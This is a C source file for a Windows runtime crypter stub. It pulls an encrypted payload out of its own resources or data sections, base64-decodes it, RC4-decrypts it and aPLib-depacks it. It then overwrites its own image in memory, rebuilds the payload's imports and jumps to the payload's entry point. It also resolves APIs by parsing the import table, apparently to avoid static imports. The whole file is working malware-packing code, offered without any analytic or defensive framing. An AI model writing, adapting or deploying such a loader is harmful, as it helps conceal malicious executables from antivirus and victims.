
#include <Windows.h>

#include "main.h"
#include "base64.h"
#include "arc4.h"
#include "aP.h"
#include "vars.h"
#include "crt.h"


int __stdcall dc2(
	struct params_cb *params
	)
{
	void				*code_base;
	struct params_cb	*p_params;
	struct api_cb		api;
	void				*p_data;
	int					data_len;
	void				*p_base64_decoded_data;
	int					base64_decoded_data_len;
	void				*p_decrypted_data;
	int					decrypted_data_len;
	void				*p_depacked_data;
	struct arc4_ctx		ctx;
	OSVERSIONINFOA		os_ver;
	wchar_t				*argv;
	int					argc;
	OEP					fnOEP;


	/* get shellcode base */
	code_base = get_code_base();


	/* api init */
	if (!api_init(code_base, params->h_instance, &api))
		return 0;


	/* save params */
	p_params = (struct params_cb *)api.VirtualAlloc(
		NULL, sizeof(struct params_cb),
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE
		);

	crt_memcpy(p_params, params, sizeof(struct params_cb));


	/* load data */
	if (p_params->is_resource)
	{
		/* data locate in resources */
		p_data = load_data_from_resources(&api, &data_len);
		if (p_data == NULL)
			api.ExitProcess(0);
	}
	else if (p_params->p_pe_data_1 != NULL && p_params->p_pe_data_2 != NULL)
	{
		/* data locate in data sections */
		data_len = p_params->pe_data_size_1 + p_params->pe_data_size_2;

		p_data = api.VirtualAlloc(
			NULL, data_len,
			MEM_COMMIT | MEM_RESERVE,
			PAGE_EXECUTE_READWRITE
			);

		if (p_data != NULL)
		{
			crt_memcpy(
				p_data, p_params->p_pe_data_1, p_params->pe_data_size_1
				);

			crt_memcpy(
				(char *)p_data + p_params->pe_data_size_1,
				p_params->p_pe_data_2, p_params->pe_data_size_2
				);
		}
		else
		{
			api.ExitProcess(0);
		}
	}
	else
	{
		api.ExitProcess(0);
	}


	/* data encoded by base64 */
	if (p_params->is_base64)
	{
		base64_decoded_data_len = base64_get_decoded_data_length(
			(unsigned char *)p_data, data_len
			);

		p_base64_decoded_data = api.VirtualAlloc(
			NULL, base64_decoded_data_len,
			MEM_COMMIT | MEM_RESERVE,
			PAGE_EXECUTE_READWRITE
			);

		if (p_base64_decoded_data != NULL)
		{
			base64_decode(
				(unsigned char *)p_base64_decoded_data,
				(unsigned char *)p_data,
				data_len, 
				base64_decoded_data_len,
				code_base
				);
		}
		else
		{
			api.ExitProcess(0);
		}
	}
	else
	{
		base64_decoded_data_len	= data_len;
		p_base64_decoded_data	= p_data;
	}



	/* decrypt data */
	decrypted_data_len	= base64_decoded_data_len;
	p_decrypted_data	= api.VirtualAlloc(
		NULL, decrypted_data_len,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE
		);

	if (p_decrypted_data != NULL)
	{
		arc4_setkey(&ctx, (unsigned char *)p_params->p_decryption_key, 32);
		arc4_decrypt(
			&ctx,
			(unsigned char *)p_decrypted_data,
			(unsigned char *)p_base64_decoded_data,
			base64_decoded_data_len
			);
	}
	else
	{
		api.ExitProcess(0);
	}

	
	/* data packed */
	if (p_params->is_packed)
	{
		p_depacked_data = api.VirtualAlloc(
			NULL, p_params->depacked_data_length,
			MEM_COMMIT | MEM_RESERVE,
			PAGE_EXECUTE_READWRITE
			);

		if (p_depacked_data != NULL)
			aP_depack(p_decrypted_data, p_depacked_data);
		else
			api.ExitProcess(0);
	}
	else
	{
		p_depacked_data					= p_decrypted_data;
		p_params->depacked_data_length	= decrypted_data_len;
	}


	/* build image and get OEP */
	fnOEP = (OEP)build_image(&api, p_params->h_instance, p_depacked_data);
	if (fnOEP == NULL)
		api.ExitProcess(0);


	/* build import */
	process_import(&api, p_params->h_instance);
	

	/* free resources */
	api.VirtualFree(p_decrypted_data, 0, MEM_RELEASE);

	if (p_params->is_packed)
		api.VirtualFree(p_depacked_data, 0, MEM_RELEASE);

	if (p_params->is_base64)
		api.VirtualFree(p_base64_decoded_data, 0, MEM_RELEASE);

	if (!p_params->is_resource)
		api.VirtualFree(p_data, 0, MEM_RELEASE);


	/* save arguments */
	argv = api.CommandLineToArgvW(api.GetCommandLineW(), &argc);


	/* reset FLS and TLS callbacks */
	os_ver.dwOSVersionInfoSize = sizeof(os_ver);

	if (!api.GetVersionExA(&os_ver))
		api.ExitProcess(0);

	if ( !(os_ver.dwMajorVersion == 5 && os_ver.dwMinorVersion == 0) &&	// Windows 2000	
		 !(os_ver.dwMajorVersion == 5 && os_ver.dwMinorVersion == 1) )	// Windows XP
	{
		reset_callbacks();
	}


	/* call OEP */
	fnOEP(argc, argv);


	api.ExitProcess(0);

	return 0;
}


void *build_image(struct api_cb *p_api, HINSTANCE h_instance, void *pe_data)
{
	PIMAGE_NT_HEADERS		p_nt_headers;
	PIMAGE_SECTION_HEADER	p_scn_header;
	void					*p_oep;
	DWORD					old_prot;
	int						i;

	p_nt_headers = (PIMAGE_NT_HEADERS)(
		(char *)pe_data + ((PIMAGE_DOS_HEADER)pe_data)->e_lfanew
		);

	p_scn_header = IMAGE_FIRST_SECTION(p_nt_headers);
	p_oep        = (char *)h_instance + p_nt_headers->OptionalHeader.AddressOfEntryPoint;


	if (!p_api->VirtualProtect(
			h_instance, p_nt_headers->OptionalHeader.SizeOfImage,
			PAGE_EXECUTE_READWRITE, &old_prot
			))
	{
		return NULL;
	}

	crt_memset(h_instance, 0, p_nt_headers->OptionalHeader.SizeOfImage);
	crt_memcpy(h_instance, pe_data, p_nt_headers->OptionalHeader.SizeOfHeaders);

	for (i = 0; i < p_nt_headers->FileHeader.NumberOfSections; i++)
	{
		crt_memcpy(
			&(((char *)h_instance)[p_scn_header[i].VirtualAddress]),
			&(((char *)pe_data)[p_scn_header[i].PointerToRawData]),
			p_scn_header[i].SizeOfRawData
			);
	}

	return p_oep;
}


void *load_data_from_resources(struct api_cb *p_api, int *size)
{
	BOOL	success = FALSE;
	void	*ptr = NULL;
	HRSRC	h_rsrc;
	HGLOBAL	h_res_load;

	h_rsrc = p_api->FindResourceA(NULL, MAKEINTRESOURCEA(1), MAKEINTRESOURCEA(101));
	if (h_rsrc != NULL)
	{
		h_res_load = p_api->LoadResource(NULL, h_rsrc);
		if (h_res_load != NULL)
		{
			*size = p_api->SizeofResource(NULL, h_rsrc);
			if (*size != 0)
				ptr = p_api->LockResource(h_res_load);
		}
	}

	return ptr;
}


BOOL api_init(void *code_base, HINSTANCE h_instance, struct api_cb *p_api)
{
	HMODULE	kernel32_base;
	HMODULE	shell32_base;


	p_api->GetProcAddress  = get_proc_address_from_kernel(h_instance, (char *)GET_PTR(szGetProcAddress, dc2, code_base));
	p_api->GetModuleHandle = get_proc_address_from_kernel(h_instance, (char *)GET_PTR(szGetModuleHandle, dc2, code_base));

	if (!p_api->GetProcAddress || !p_api->GetProcAddress)
		return FALSE;

	kernel32_base = p_api->GetModuleHandle((char *)GET_PTR(szKernel32Dll, dc2, code_base));

	p_api->VirtualProtect  = p_api->GetProcAddress(kernel32_base, (char *)GET_PTR(szVirtualProtect, dc2, code_base));
	p_api->VirtualAlloc    = p_api->GetProcAddress(kernel32_base, (char *)GET_PTR(szVirtualAlloc, dc2, code_base));
	p_api->VirtualFree     = p_api->GetProcAddress(kernel32_base, (char *)GET_PTR(szVirtualFree, dc2, code_base));
	p_api->ExitProcess     = p_api->GetProcAddress(kernel32_base, (char *)GET_PTR(szExitProcess, dc2, code_base));
	p_api->LoadLibraryA    = p_api->GetProcAddress(kernel32_base, (char *)GET_PTR(szLoadLibraryA, dc2, code_base));
	p_api->GetVersionExA   = p_api->GetProcAddress(kernel32_base, (char *)GET_PTR(szGetVersionExA, dc2, code_base));

	shell32_base = p_api->LoadLibraryA((char *)GET_PTR(szShell32Dll, dc2, code_base));

	p_api->GetCommandLineW    = p_api->GetProcAddress(kernel32_base, (char *)GET_PTR(szGetCommandLineW, dc2, code_base));
	p_api->CommandLineToArgvW = p_api->GetProcAddress(shell32_base, (char *)GET_PTR(szCommandLineToArgvW, dc2, code_base));

	p_api->FindResourceA  = p_api->GetProcAddress(kernel32_base, (char *)GET_PTR(szFindResourceA, dc2, code_base));
	p_api->LoadResource   = p_api->GetProcAddress(kernel32_base, (char *)GET_PTR(szLoadResource, dc2, code_base));
	p_api->SizeofResource = p_api->GetProcAddress(kernel32_base, (char *)GET_PTR(szSizeofResource, dc2, code_base));
	p_api->LockResource   = p_api->GetProcAddress(kernel32_base, (char *)GET_PTR(szLockResource, dc2, code_base));

	if (p_api->VirtualProtect == NULL ||
		p_api->VirtualAlloc == NULL ||
		p_api->VirtualFree == NULL ||
		p_api->ExitProcess == NULL ||
		p_api->LoadLibraryA == NULL ||
		p_api->GetCommandLineW == NULL ||
		p_api->CommandLineToArgvW == NULL ||
		p_api->FindResourceA == NULL ||
		p_api->LoadResource == NULL ||
		p_api->SizeofResource == NULL ||
		p_api->LockResource == NULL)
	{
		return FALSE;
	}


	p_api->LoadLibraryA((char *)GET_PTR(szComdlg32Dll, dc2, code_base));


	return TRUE;
}


void *get_proc_address_from_kernel(void *h_instance, char *proc_name)
{
	PIMAGE_NT_HEADERS			p_nt_hdrs;
	PIMAGE_DATA_DIRECTORY		p_imp_dir;
	PIMAGE_IMPORT_DESCRIPTOR	p_imp_desc;
	PIMAGE_THUNK_DATA			p_thunk_data, p_orig_thunk_data;
	PIMAGE_IMPORT_BY_NAME		p_imp_by_name;
	PBYTE						lib_name;
	void						*proc_addr;
	int							i;

	proc_addr = 0;

	p_nt_hdrs = (PIMAGE_NT_HEADERS)(
		(char *)h_instance + ((PIMAGE_DOS_HEADER)h_instance)->e_lfanew
		);

	p_imp_dir =
		&p_nt_hdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];

	if (p_imp_dir->Size == 0)
		return NULL;

	p_imp_desc = (PIMAGE_IMPORT_DESCRIPTOR)(
		(char *)h_instance + p_imp_dir->VirtualAddress
		);

	while (p_imp_desc->Name)
	{
		lib_name = (PBYTE)(
			(char *)h_instance + p_imp_desc->Name
			);

		if (lib_name[0] == 'K' &&
			lib_name[1] == 'E' &&
			lib_name[2] == 'R' &&
			lib_name[3] == 'N' &&
			lib_name[4] == 'E' &&
			lib_name[5] == 'L'
			)
		{
			p_thunk_data = (PIMAGE_THUNK_DATA)(
				(char *)h_instance + p_imp_desc->FirstThunk
				);

			p_orig_thunk_data = (PIMAGE_THUNK_DATA)(
				(char *)h_instance + p_imp_desc->OriginalFirstThunk
				);

			while (p_orig_thunk_data->u1.AddressOfData)
			{
				if (!IMAGE_SNAP_BY_ORDINAL(p_orig_thunk_data->u1.Ordinal))
				{
					p_imp_by_name = (PIMAGE_IMPORT_BY_NAME)(
						(char *)h_instance + p_orig_thunk_data->u1.AddressOfData
						);
					
					for (i = 0; p_imp_by_name->Name[i]; i++)
					{
						if (p_imp_by_name->Name[i] != proc_name[i])
							break;
					}

					if (p_imp_by_name->Name[i] == 0 && proc_name[i] == 0)
						proc_addr = (void *)p_thunk_data->u1.Function;
				}

				p_thunk_data++;
				p_orig_thunk_data++;
			}

			break;
		}

		p_imp_desc++;
	}

	return (void *)proc_addr;
}


void process_import(struct api_cb *p_api, void *pe_mem)
{
	PIMAGE_NT_HEADERS			p_nt_hdrs;
	PIMAGE_DATA_DIRECTORY		p_imp_dir;
	PIMAGE_IMPORT_DESCRIPTOR	p_imp_desc;
	PIMAGE_THUNK_DATA			p_thunk_data;
	PIMAGE_IMPORT_BY_NAME		p_imp_by_name;
	PBYTE						lib_name;
	void						*lib_base;
	void						*proc_addr;


	p_nt_hdrs = (PIMAGE_NT_HEADERS)(
		(char *)pe_mem + ((PIMAGE_DOS_HEADER)pe_mem)->e_lfanew
		);

	p_imp_dir =
		&p_nt_hdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];

	if (p_imp_dir->Size == 0)
		return;

	p_imp_desc = (PIMAGE_IMPORT_DESCRIPTOR)(
		(char *)pe_mem + p_imp_dir->VirtualAddress
		);

	while (p_imp_desc->Name)
	{
		lib_name = (PBYTE)(
			(char *)pe_mem + p_imp_desc->Name
			);

		lib_base = p_api->LoadLibrary((char *)lib_name);
		if (!lib_base)
			break;

		p_thunk_data = (PIMAGE_THUNK_DATA)(
			(char *)pe_mem + p_imp_desc->FirstThunk
			);

		while (p_thunk_data->u1.AddressOfData)
		{
			if (IMAGE_SNAP_BY_ORDINAL(p_thunk_data->u1.Ordinal))
			{
				proc_addr = p_api->GetProcAddress(
					(HMODULE)lib_base, (char *)IMAGE_ORDINAL(p_thunk_data->u1.Ordinal)
					);
			}
			else
			{
				p_imp_by_name = (PIMAGE_IMPORT_BY_NAME)(
					(char *)pe_mem + p_thunk_data->u1.AddressOfData
					);

				proc_addr = p_api->GetProcAddress(
					(HMODULE)lib_base, (char *)&p_imp_by_name->Name
					);
			}

			p_thunk_data->u1.Function = (ULONG_PTR)proc_addr;

			p_thunk_data++;
		}

		p_imp_desc++;
	}
}


int __stdcall WinMain(
	HINSTANCE hInstance,
	HINSTANCE hPrevInstance,
	LPSTR lpCmdLine,
	int nCmdShow
	)
{
	struct params_cb params;

#ifdef _WIN64
	params.h_instance = (HINSTANCE)0x0000000140000000;
#else
	params.h_instance = (HINSTANCE)0x400000;
#endif
	params.is_base64 = TRUE;
	params.is_packed = TRUE;
	params.is_resource = FALSE;
	params.p_pe_data_1 = pe_data_1;
	params.p_pe_data_2 = pe_data_2;
	params.pe_data_size_1 = sizeof(pe_data_1);
	params.pe_data_size_2 = sizeof(pe_data_2);
	params.depacked_data_length = depacked_data_length;
	params.p_decryption_key = decryption_key;

	dc2(&params);

	GetProcAddress(GetModuleHandleA("kernel32.dll"), "GetProcAddress");

	return 0;
}